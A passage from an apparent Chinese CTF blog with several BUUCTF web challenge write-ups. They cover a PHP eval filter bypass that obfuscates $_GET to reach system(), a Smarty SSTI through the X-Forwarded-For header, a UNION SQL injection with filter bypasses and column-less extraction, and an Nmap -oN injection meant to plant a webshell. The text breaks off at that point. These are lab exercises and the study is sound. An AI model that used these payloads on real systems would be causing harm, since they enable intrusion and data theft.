class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs py">s = <span class="hljs-string">&quot;_GET&quot;</span><br>s_hex = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(s)):<br>    s_hex = s_hex+<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(s[i]))[<span class="hljs-number">2</span>:]+<span class="hljs-string">&quot; &quot;</span><br><span class="hljs-built_in">print</span>(s_hex)<br></code></pre></td></tr></table></figure><p>输出:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">5f 47 45 54 <br></code></pre></td></tr></table></figure><p>发现16进制表示中含有字母，所以会被preg_match_all()函数提取，所以要将该16进制转化为10进制，再由dechex() 将10进制转回给16进制</p><p><strong>16进制转10进制：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">print</span>(<span class="hljs-title function_ invoke__">base_convert</span>(<span class="hljs-string">&quot;5f474554&quot;</span>,<span class="hljs-number">16</span>,<span class="hljs-number">10</span>).<span class="hljs-string">&quot;\n&quot;</span>);<br><span class="hljs-comment">//1598506324</span><br></code></pre></td></tr></table></figure><p>_GET的payload的构造:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">_GET=hex2bin(&quot;5f474554&quot;)<br>hex2bin=base_convert(&quot;37907361743&quot;,10,36)()<br>&quot;5f474554&quot;=dechex(&quot;1598506324&quot;)<br>_GET=base_convert(&quot;37907361743&quot;,10,36)(dechex(&quot;1598506324&quot;))<br></code></pre></td></tr></table></figure><p>所以$_GET{}:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">$(base_convert(&quot;37907361743&quot;,10,36)(dechex(&quot;1598506324&quot;)))&#123;&#125;<br></code></pre></td></tr></table></figure><p>5.构造payload</p><p>原来的payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?c=$_GET&#123;abs&#125;($_GET&#123;atan&#125;)&amp;abs=system&amp;atan=ls /<br></code></pre></td></tr></table></figure><p>转换payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?c=$(base_convert(&quot;37907361743&quot;,10,36)(dechex(&quot;1598506324&quot;)))&#123;abs&#125;($(base_convert(&quot;37907361743&quot;,10,36)(dechex(&quot;1598506324&quot;)))&#123;atan&#125;)&amp;abs=system&amp;atan=ls /<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-24_LoveMath/image-20230824143815219.png" alt="image-20230824143815219"></p><p>由于c的长度太长所以必须简化payload</p><p>测试：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;test1&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$a</span>)&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;111&quot;</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag is here&quot;</span>;<br><span class="hljs-comment">//$pi=base_convert(37907361743,10,36)(dechex(1598506324));</span><br><span class="hljs-comment">//($$pi)&#123;a&#125;(($$pi)&#123;b&#125;);</span><br><span class="hljs-comment">//($_GET&#123;a&#125;)($_GET&#123;b&#125;);</span><br><span class="hljs-variable">$base_convert</span>(<span class="hljs-string">&quot;37907361743&quot;</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)(<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-string">&quot;1598506324&quot;</span>))&#123;a&#125;(<span class="hljs-variable">$base_convert</span>(<span class="hljs-string">&quot;37907361743&quot;</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)(<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-string">&quot;1598506324&quot;</span>))&#123;b&#125;);<br></code></pre></td></tr></table></figure><p>输出：<br><img src="/images/2023-8-24_LoveMath/image-20230824152553792.png" alt="image-20230824152553792"></p><p>发现系统命令没有被执行，所以直接应用的方式是错误的，我们需要采用间接引用字符串的方式：</p><p><strong>测试:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;test1&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$a</span>)&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;111&quot;</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag is here&quot;</span>;<br><span class="hljs-variable">$_GET</span>&#123;a&#125;(<span class="hljs-variable">$_GET</span>&#123;b&#125;);<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?a=system&amp;b=dir<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-24_LoveMath/image-20230824144645504.png" alt="image-20230824144645504"></p><p>发生了输出，说明system(dir)在没有echo的情况下依然可以输出内容</p><p>所以我们可以构造多句合法PHP代码使其存在于eval()函数中，使该函数执行多条PHP代码，然后我们在对其进行注入（类似于插入一句话木马）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;test1&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$a</span>)&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;111&quot;</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag is here&quot;</span>;<br><span class="hljs-comment">//$pi=base_convert(37907361743,10,36)(dechex(1598506324));</span><br><span class="hljs-comment">//($$pi)&#123;a&#125;(($$pi)&#123;b&#125;);</span><br><span class="hljs-comment">//($_GET&#123;a&#125;)($_GET&#123;b&#125;);</span><br><span class="hljs-variable">$pi</span>=<span class="hljs-title function_ invoke__">base_convert</span>(<span class="hljs-string">&quot;37907361743&quot;</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)(<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-string">&quot;1598506324&quot;</span>));<br><span class="hljs-variable">$$pi</span>&#123;a&#125;(<span class="hljs-variable">$$pi</span>&#123;b&#125;);<br></code></pre></td></tr></table></figure><p>输出:<br><img src="/images/2023-8-24_LoveMath/image-20230824152828967.png" alt="image-20230824152828967"></p><p>6.用间接引用简化payload(使用pi作为参数是因为它既是白名单字符串，同时也很短):</p><p>在PHP函数的参数中string类型都可以不用加双引号或单引号，PHP会自动进行解析,同时用GET或POST方法传输内容时也不需要””和’’:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi&#123;abs&#125;($$pi&#123;atan&#125;);&amp;abs=system&amp;atan=ls /<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-24_LoveMath/image-20230824153549268.png" alt="image-20230824153549268"></p><p>发现flag文件，将其打开查看:<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi&#123;abs&#125;($$pi&#123;atan&#125;);&amp;abs=system&amp;atan=cat /flag<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-24_LoveMath/image-20230824153729500.png" alt="image-20230824153729500"></p><p>flag &#x3D; flag{26bb1d2a-6719-409c-88f7-14461687b994}</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF_WEB_[CISCN2019 华东南赛区]Web11 题解</title>
    <link href="/2023/08/23/2023-08-23-%5BCISCN2019%20%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA%5DWeb11/"/>
    <url>/2023/08/23/2023-08-23-%5BCISCN2019%20%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA%5DWeb11/</url>
    
    <content type="html"><![CDATA[<h2 id="CISCN2019-华东南赛区-Web11"><a href="#CISCN2019-华东南赛区-Web11" class="headerlink" title="[CISCN2019 华东南赛区]Web11"></a>[CISCN2019 华东南赛区]Web11</h2><p>1.打开网页后观察:</p><p><img src="/images/2023-8-23_Web11/image-20230823120850043.png" alt="image-20230823120850043"></p><p>根据网页显示的内容得，我们可能需要对网页的请求头进行更改</p><p>2.BP抓包:<br><img src="/images/2023-8-23_Web11/image-20230823121029643.png" alt="image-20230823121029643"></p><p>由网页显示的内容得，我们可能需要修改headers中的X-Forwarded-For</p><p>对该字段进行修改，先随便写一个IP：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">X-Forwarded-For:127.0.0.1<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-23_Web11/image-20230823121206963.png" alt="image-20230823121206963"></p><p>我们输入的内容在网页的Current IP中显示，即我们输入的内容可以被渲染传送到html中显示，所以猜测该字段存在ssti注入</p><p>3.判断是否存在模板注入:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">X-Forwarded-For:&#123;&#123;8*8&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-23_Web11/image-20230823121359664.png" alt="image-20230823121359664"></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">&#123;&#123;&#125;&#125;中的代码被执行输出64，所以该字段存在ssti注入<br></code></pre></td></tr></table></figure><p>4.判断该模板的类型:<br>用判断是否为Smarty模板注入:<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">X-Forwarded-For:&#123;&#123;$smarty.version&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-23_Web11/image-20230823121632709.png" alt="image-20230823121632709"></p><p>爆出版本信息:3.1.30,所以该网页使用的是smarty模板</p><p>5.使用ssti在Smarty模板中的恶意代码:<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">X-Forwarded-For:&#123;&#123;system(&quot;ls /&quot;)&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-23_Web11/image-20230823121828541.png" alt="image-20230823121828541"></p><p>发现有一个flag文件，查看flag文件的内容:<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">X-Forwarded-For:&#123;&#123;system(&quot;cat /flag&quot;)&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-23_Web11/image-20230823121932270.png" alt="image-20230823121932270"></p><p>flag&#x3D;flag{0f8c1a6e-bf4c-4d5e-ad9e-f6282d3fe876}</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF_WEB_[SWPU2019]Web1 题解</title>
    <link href="/2023/08/23/2023-08-23-%5BSWPU2019%5DWeb1/"/>
    <url>/2023/08/23/2023-08-23-%5BSWPU2019%5DWeb1/</url>
    
    <content type="html"><![CDATA[<h2 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h2><p>1.点击网页之后，注册一个账户，然后登录(登录界面和注册界面的sql注入已经测试，发现没有用):<br><img src="/images/2023-08-23_Web1/image-20230823141144322.png" alt="image-20230823141144322"></p><p>2.点击申请一个广告:</p><p><img src="/images/2023-08-23_Web1/image-20230823141243172.png" alt="image-20230823141243172"></p><p>在该页面中也存在疑似注入点，先随机申请一个广告:<br><img src="/images/2023-08-23_Web1/image-20230823141351148.png" alt="image-20230823141351148"></p><p>3.点击广告详情:<br><img src="/images/2023-08-23_Web1/image-20230823141456102.png" alt="image-20230823141456102"></p><p>显示了该广告的内容</p><p>4.猜测该页面的事务处理逻辑：<br><strong>申请广告页面:</strong></p><p>insert into table VALUES(“广告名”,”广告内容”,……..);</p><p><strong>index.php显示内容：</strong><br>select * from table</p><p><strong>广告详情页面:</strong></p><p>select * from table where 广告名 &#x3D;’从界面列表中获取的广告名’</p><p><strong>验证猜测：</strong></p><p>在申请广告页面中:<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">广告名:1&#x27;<br>广告内容:aaaaa<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823142529330.png" alt="image-20230823142529330"></p><p>点击广告详情:<br><img src="/images/2023-08-23_Web1/image-20230823142551729.png" alt="image-20230823142551729"></p><p>发生sql报错，所以可以证实我们的猜想，广告详情存在sql注入漏洞:<br>select * from table where 广告名 &#x3D;’1’’</p><p>5.sql注入:<br><strong>第一步，爆字段：</strong></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27; union select 1,2,3 #<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823143036837.png" alt="image-20230823143036837"></p><p>发现对输入内容进行了过滤,对输入内容进行判断，看看它过滤了哪些内容:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27; union<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823143210775.png" alt="image-20230823143210775"></p><p>可以进行申请，但是在显示的内容中空格被消除了，说明网页对空格进行了处理:<br><strong>对空格进行绕过:</strong><br><img src="/images/2023-08-23_Web1/image-20230823143443665.png" alt="image-20230823143443665"></p><p>所以空格可以用&#x2F;**&#x2F;代替</p><p><img src="/images/2023-08-23_Web1/image-20230823144042281.png" alt="image-20230823144042281"></p><p>所以也可以用()绕过空格</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27;/**/union/**/select<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823144331977.png" alt="image-20230823144331977"></p><p>没有过滤select</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27;/**/union/**/select/**/1,2,3#<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823144539306.png" alt="image-20230823144539306"></p><p>说明该站点过滤了#</p><p><strong>#号绕过：</strong></p><p><img src="/images/2023-08-23_Web1/image-20230823145455569.png" alt="image-20230823145455569"></p><p>所以可以用&#x2F;**&#x2F;‘通过闭合’绕过</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27;/**/union/**/select/**/1,2,3/**/&#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823145739643.png" alt="image-20230823145739643"></p><p>点击广告详情:<br><img src="/images/2023-08-23_Web1/image-20230823145919546.png" alt="image-20230823145919546"></p><p>成功爆出字段不一致的错误，说明当前注入方式正确，现在只要一步步添加上去或减少，来确认它到底有多少字段(也可以用order by 或group by 来判断有多少字段),最终添加到22的时候成功:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27;/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823150404948.png" alt="image-20230823150404948"></p><p>点击广告详情:<br><img src="/images/2023-08-23_Web1/image-20230823150443148.png" alt="image-20230823150443148"></p><p>没有报错，说明当前表总共有22个字段,且由显示的内容得，只显示了2，3，说明该数据表的内容在html中（在数据库中select一定是全部搜索出来的）只显示第二个字段和第三个字段，所以我们要爆的内容也只能在这两个字段中显示</p><p><strong>第二步，爆数据库</strong>：</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27;/**/union/**/select/**/1,group_concat(database()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823151000019.png" alt="image-20230823151000019"></p><p>爆出数据库只有web1</p><p><strong>第三步，爆表：</strong></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27;/**/union/**/select/**/1,group_concat(table_name),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/from/**/information_schema.tables/**/where/**/table_schema=DATABASE()/**/&#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823152137236.png" alt="image-20230823152137236"></p><p>对输入内容进行一一判断:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27;/**/union/**/select/**/1,group_concat(table_name),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/from<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823152224914.png" alt="image-20230823152224914"></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27;/**/union/**/select/**/1,group_concat(table_name),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/from/**/information_schema.tables<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823152317844.png" alt="image-20230823152317844"></p><p>猜测敏感词汇为information_schema.tables</p><p><strong>information_schema.tables绕过：</strong></p><p><img src="/images/2023-08-23_Web1/image-20230823152947582.png" alt="image-20230823152947582"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27;/**/union/**/select/**/1,group_concat(table_name),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=&#x27;web1&#x27;/**/&#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823153243260.png" alt="image-20230823153243260"></p><p>点击广告详情:<br><img src="/images/2023-08-23_Web1/image-20230823153322133.png" alt="image-20230823153322133"></p><p>爆出两张表:ads,users</p><p><strong>第四步，爆表的字段：</strong></p><p>先爆ads的字段</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27;/**/union/**/select/**/1,group_concat(column_name),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/from/**/information_schema.COLUMNS/**/where table_schema=&#x27;web1&#x27;/**/and/**/table_name=&#x27;ads&#x27;/**/&#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823153803945.png" alt="image-20230823153803945"></p><p>对注入内容进行一一判断:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">group_concat(column_name)<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823153845408.png" alt="image-20230823153845408"></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27;/**/union/**/select/**/1,group_concat(column_name),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/from/**/information_schema.COLUMNS<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823153914234.png" alt="image-20230823153914234"></p><p>猜测可能是对information_schema.COLUMNS进行了过滤</p><p><strong>information_schema.COLUMNS绕过:</strong></p><p>由于无法绕过information_schema.COLUMNS，但是在已经知道表明的情况下可以采用无列名爆破法:</p><p>参考:[<a href="https://blog.csdn.net/shinygod/article/details/123681039">SWPU2019]Web1 1_succ3的博客-CSDN博客</a></p><p>参考的payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs txt">普通的sq查询<br>select * from users<br><br>查询表，并把列名替换为1，2，3.4，5，6<br>select 1,2,3,4,5 ,6 union select * from users<br><br>单独把第四列提出来，(select 1,2,3,4,5,6 union select * from users)a给查询结果命名<br> select `4` from (select 1,2,3,4,5,6 union select * from users)a;<br><br>若反引号被过滤，可以这样<br>select b from (select 1,2,3 as b,4,5 union select * from users)a;<br><br>测试:<br>-- 在已经知道beanbook表，但是不知道其字段名的情况下，爆出该表的字段值<br>-- 爆出第3列的值,把3当作第三列的字段名<br>select `3` from <br>(select 1,2,3,4,5,6 union select * from beanbook) as b<br><br>-- 爆出第1列的值，把别名a当作第一列的字段名<br>select a from <br>(select 1 as a,2,3,4,5,6 union select * from beanbook) as b<br></code></pre></td></tr></table></figure><p>无列名爆破法测试:</p><p>第一种:</p><p><img src="/images/2023-08-23_Web1/image-20230823155738540.png" alt="image-20230823155738540"></p><p>第二种:<br><img src="/images/2023-08-23_Web1/image-20230823155947247.png" alt="image-20230823155947247"></p><p>根据无名列爆破的payload,我们先要确认该表有多少个字段:</p><p>（flag在users表中，所以在这里省略对ads表的判断，思路和users表一样）</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27;/**/union/**/select/**/1,(select/**/group_concat(b)/**/from(select/**/1/**/as/**/b/**/union/**/select*from/**/users)/**/as/**/x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823161617410.png" alt="image-20230823161617410"></p><p>继续添加字段，（省略两个字段的判断）</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27;/**/union/**/select/**/1,(select/**/group_concat(b)/**/from(select/**/1/**/as/**/b,2,3/**/union/**/select*from/**/users)/**/as/**/x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823161924192.png" alt="image-20230823161924192"></p><p>回显了第一列的所有内容，说明users表的字段有三个</p><p>回显第二个字段的内容:</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27;/**/union/**/select/**/1,(select/**/group_concat(b)/**/from(select/**/1,2/**/as/**/b,3/**/union/**/select*from/**/users)/**/as/**/x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823162104825.png" alt="image-20230823162104825"></p><p>发现了flag,但是不是flag的内容，说明flag内容在第三个字段中</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27;/**/union/**/select/**/1,(select/**/group_concat(b)/**/from(select/**/1,2,3/**/as/**/b/**/union/**/select*from/**/users)/**/as/**/x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823162243017.png" alt="image-20230823162243017"></p><p>flag&#x3D;flag{507104d6-24f2-405b-8de5-f60bdc690138}</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF_WEB_[网鼎杯 2020 朱雀组]Nmap 题解</title>
    <link href="/2023/08/22/2023-08-22-%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E6%9C%B1%E9%9B%80%E7%BB%84%5DNmap/"/>
    <url>/2023/08/22/2023-08-22-%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E6%9C%B1%E9%9B%80%E7%BB%84%5DNmap/</url>
    
    <content type="html"><![CDATA[<h2 id="网鼎杯-2020-朱雀组-Nmap"><a href="#网鼎杯-2020-朱雀组-Nmap" class="headerlink" title="[网鼎杯 2020 朱雀组]Nmap"></a>[网鼎杯 2020 朱雀组]Nmap</h2><p>1.有题目提示得这是一道考察Nmap执行的题目:<br><img src="/images/2023-08-22_Nmap/image-20230822100327583.png" alt="image-20230822100327583"></p><p>输入框中我们可以输入ip地址或hostname</p><p>测试:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">127.0.0.1<br></code></pre></td></tr></table></figure><p>响应结果:</p><p><img src="/images/2023-08-22_Nmap/image-20230822100434322.png" alt="image-20230822100434322"></p><p>2.在kali中测试nmap:</p><p>nmap对ip地址的处理</p><p><strong>扫描IP地址:</strong></p><p>nmap 127.0.0.1:<br><img src="/images/2023-08-22_Nmap/image-20230822101659678.png" alt="image-20230822101659678"></p><p>返回的结果:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">Not shown: 1000 closed tcp ports (conn-refused)<br><br>Nmap done: 1 IP address (1 host up) scanned in 0.04 seconds<br></code></pre></td></tr></table></figure><p>而网站中的返回结果为:</p><p><img src="/images/2023-08-22_Nmap/image-20230822102909620.png" alt="image-20230822102909620"></p><p>两者的返回结果都是TCP协议，然后有Nmap done: 1 IP address (1 host up) scanned in 0.04 seconds</p><p>**扫描指定IP地址(ping 扫描)**：<br><img src="/images/2023-08-22_Nmap/image-20230822103048486.png" alt="image-20230822103048486"></p><p>返回结果中没有表明是TCP协议</p><p>所以一般网站使用TCP返回，都是nmap扫描或nmap -sT 扫描(默认是nmap)</p><p>猜测该网址的扫描形式为:nmap “输入的ip地址”</p><p>2.nmap扫描漏洞利用:</p><p>nmap中可以用于将扫描结果写文件并输出保存在本地的命令:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs txt">-oN (标准输出)<br><br>-oX (XML输出)<br><br>-oS (ScRipT KIdd|3 oUTpuT)<br><br>-oG (Grep输出)<br><br>-oA (输出至所有格式)<br></code></pre></td></tr></table></figure><p>测试:<br>nmap  127.0.0.1 -oN test.txt:<br><img src="/images/2023-08-22_Nmap/image-20230822104553681.png" alt="image-20230822104553681"></p><p>发现在当前文件夹中生成了一个test.txt文件</p><p>所以我们可以利用输出这个漏洞，将一句话木马写入文件中，利用该输出漏洞将一句话木马文件保存到网页的当前文件夹中，就可以实现注入</p><p>测试2:</p><p>测试网页是否可以进行输出命令的执行:<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">127.0.0.1 -oN test.txt<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-22_Nmap/image-20230822105255949.png" alt="image-20230822105255949"></p><p>网页成功回显，且返回的结果和测试的结果相似，说明该指令被成功执行，所以我们就可以构造注入payload</p><p>3.构造一句话木马:</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span 